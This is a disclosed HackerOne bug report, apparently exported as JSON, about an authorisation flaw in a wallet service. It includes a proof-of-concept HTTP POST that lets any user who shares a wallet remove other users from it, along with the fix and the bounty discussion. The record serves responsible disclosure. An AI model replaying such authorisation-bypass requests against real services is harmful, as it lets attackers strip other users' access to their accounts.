{"id":85720,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTcyMA==","url":"https://hackerone.com/reports/85720","title":"IDOR on remoing Share","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-08-30T18:46:30.968Z","submitted_at":"2015-08-30T18:46:30.968Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"crab","url":"/crab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/333/05e3a85c640b2618b06ab1aaff8a51c405717c2e_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":563,"url":"https://hackerone.com/enter","handle":"enter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/563/c57c2cff9d127ea563dabf763e1d340bada8dcb2_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/563/c57c2cff9d127ea563dabf763e1d340bada8dcb2_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Enter","twitter_handle":"enterhq","website":"https://wallet.enter.financial","about":"Keeps people out of collections while getting businesses paid."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-11-27T06:26:11.492Z","bug_reporter_agreed_on_going_public_at":"2015-10-28T06:26:03.474Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Issue**\r\nIn case of Operator Wallets, only `Owner` has the permission to delete share with any user. But It is possible for any user to delete share for any other user.\r\n\r\n**POC**\r\n1. Suppose a wallet `BITCOINS` is created by user A and shared with user B and C.\r\n2. User B can send the following request and delete User C as there are no server side verifications\r\n\r\n    POST /dashboard/account/\u003caccountID\u003e/sharing/delete HTTP/1.1\r\n    Host: wallet.romit.io\r\n    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0\r\n    Accept: */*\r\n    Accept-Language: en-US,en;q=0.5\r\n    Accept-Encoding: gzip, deflate\r\n    Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n    X-Requested-With: XMLHttpRequest\r\n    Referer: https://wallet.romit.io/dashboard\r\n    Content-Length: 90\r\n    Cookie: \u003credatcted\u003e\r\n    Connection: keep-alive\r\n    Pragma: no-cache\r\n    Cache-Control: no-cache\r\n\r\n    bankUserId=\u003cUser C's ID\u003e\u0026_csrf=3b919c4a-776f-4144-84b7-88d315f57815\r\n\r\n**Solution**\r\nVerify that the user who is deleting the user is actually an owner for that wallet.\r\n\r\nThanks\r\nSparsh","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eIssue\u003c/strong\u003e\u003cbr\u003e\nIn case of Operator Wallets, only \u003ccode\u003eOwner\u003c/code\u003e has the permission to delete share with any user. But It is possible for any user to delete share for any other user.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ePOC\u003c/strong\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eSuppose a wallet \u003ccode\u003eBITCOINS\u003c/code\u003e is created by user A and shared with user B and C.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eUser B can send the following request and delete User C as there are no server side verifications\u003c/p\u003e\n\n\u003cp\u003ePOST /dashboard/account/\u0026lt;accountID\u0026gt;/sharing/delete HTTP/1.1\u003cbr\u003e\nHost: wallet.romit.io\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0\u003cbr\u003e\nAccept: \u003cem\u003e/\u003c/em\u003e\u003cbr\u003e\nAccept-Language: en-US,en;q=0.5\u003cbr\u003e\nAccept-Encoding: gzip, deflate\u003cbr\u003e\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\u003cbr\u003e\nX-Requested-With: XMLHttpRequest\u003cbr\u003e\nReferer: \u003ca title=\"https://wallet.romit.io/dashboard\" href=\"/redirect?url=https%3A%2F%2Fwallet.romit.io%2Fdashboard\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://wallet.romit.io/dashboard\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nContent-Length: 90\u003cbr\u003e\nCookie: \u0026lt;redatcted\u0026gt;\u003cbr\u003e\nConnection: keep-alive\u003cbr\u003e\nPragma: no-cache\u003cbr\u003e\nCache-Control: no-cache\u003c/p\u003e\n\n\u003cp\u003ebankUserId=\u0026lt;User C\u0026#39;s ID\u0026gt;\u0026amp;_csrf=3b919c4a-776f-4144-84b7-88d315f57815\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003cstrong\u003eSolution\u003c/strong\u003e\u003cbr\u003e\nVerify that the user who is deleting the user is actually an owner for that wallet.\u003c/p\u003e\n\n\u003cp\u003eThanks\u003cbr\u003e\nSparsh\u003c/p\u003e\n","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-11-27T06:26:03.547Z","allow_singular_disclosure_after":-160619778.83956346,"singular_disclosure_allowed":true,"vote_count":1,"voters":["wargsec"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":570009,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2015-08-31T19:31:51.723Z","updated_at":"2015-08-31T19:31:51.723Z","actor":{"username":"darin","cleared":false,"url":"/darin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/507/76e31bc0fcd1932a06b10f4e7382091a2a45f64a_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"enter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":581393,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi guys, any update on this?\n\nThanks\nCrab","markdown_message":"\u003cp\u003eHi guys, any update on this?\u003c/p\u003e\n\n\u003cp\u003eThanks\u003cbr\u003e\nCrab\u003c/p\u003e\n","automated_response":false,"created_at":"2015-09-08T15:45:23.976Z","updated_at":"2015-09-08T15:45:23.976Z","actor":{"username":"crab","cleared":false,"url":"/crab","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/333/05e3a85c640b2618b06ab1aaff8a51c405717c2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"enter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":583101,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We believe to have resolved this issue, can you confirm?","markdown_message":"\u003cp\u003eWe believe to have resolved this issue, can you confirm?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-09-09T20:41:19.207Z","updated_at":"2015-09-09T20:41:19.207Z","actor":{"username":"thallium205","cleared":false,"url":"/thallium205","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/608/bdef748d3aa294829f5ff0cc617b03543ab883f0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"enter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":583125,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi thallium205, this is fixed.\n\n","markdown_message":"\u003cp\u003eHi thallium205, this is fixed.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-09-09T20:47:02.000Z","updated_at":"2015-09-09T20:47:02.000Z","actor":{"username":"crab","cleared":false,"url":"/crab","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/333/05e3a85c640b2618b06ab1aaff8a51c405717c2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"enter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":583127,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2015-09-09T20:48:22.710Z","updated_at":"2015-09-09T20:48:22.710Z","actor":{"username":"thallium205","cleared":false,"url":"/thallium205","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/608/bdef748d3aa294829f5ff0cc617b03543ab883f0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"crab","url":"/crab"},"genius_execution_id":null,"team_handle":"enter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":583128,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you for helping us resolve this issue.  In this case, our security was adjusted for better defense in depth, but no direct exploitation is possible.  As a result, we are rewarding $50 for identifying it.\nThanks again!","markdown_message":"\u003cp\u003eThank you for helping us resolve this issue.  In this case, our security was adjusted for better defense in depth, but no direct exploitation is possible.  As a result, we are rewarding $50 for identifying it.\u003cbr\u003e\nThanks again!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-09-09T20:48:45.425Z","updated_at":"2015-09-09T20:48:45.425Z","actor":{"url":"/enter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/563/c57c2cff9d127ea563dabf763e1d340bada8dcb2_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Enter"}},"bounty_amount":"50.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"enter","collaborator":{"username":"crab","url":"/crab"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":583135,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This was a direct exploitation i believe.","markdown_message":"\u003cp\u003eThis was a direct exploitation i believe.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-09-09T20:51:27.911Z","updated_at":"2015-09-09T20:51:27.911Z","actor":{"username":"crab","cleared":false,"url":"/crab","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/333/05e3a85c640b2618b06ab1aaff8a51c405717c2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"enter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":583136,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"It sure was.","markdown_message":"\u003cp\u003eIt sure was.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-09-09T20:53:20.011Z","updated_at":"2015-09-09T20:53:20.011Z","actor":{"url":"/enter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/563/c57c2cff9d127ea563dabf763e1d340bada8dcb2_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Enter"}},"bounty_amount":"200.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"enter","collaborator":{"username":"crab","url":"/crab"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":635035,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-10-28T06:26:03.493Z","updated_at":"2015-10-28T06:26:03.493Z","first_to_agree":true,"actor":{"username":"crab","cleared":false,"url":"/crab","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/333/05e3a85c640b2618b06ab1aaff8a51c405717c2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"enter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":700482,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-11-27T06:26:11.531Z","updated_at":"2015-11-27T06:26:11.531Z","actor":{"url":"/enter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/563/c57c2cff9d127ea563dabf763e1d340bada8dcb2_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Enter"}},"genius_execution_id":null,"team_handle":"enter","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}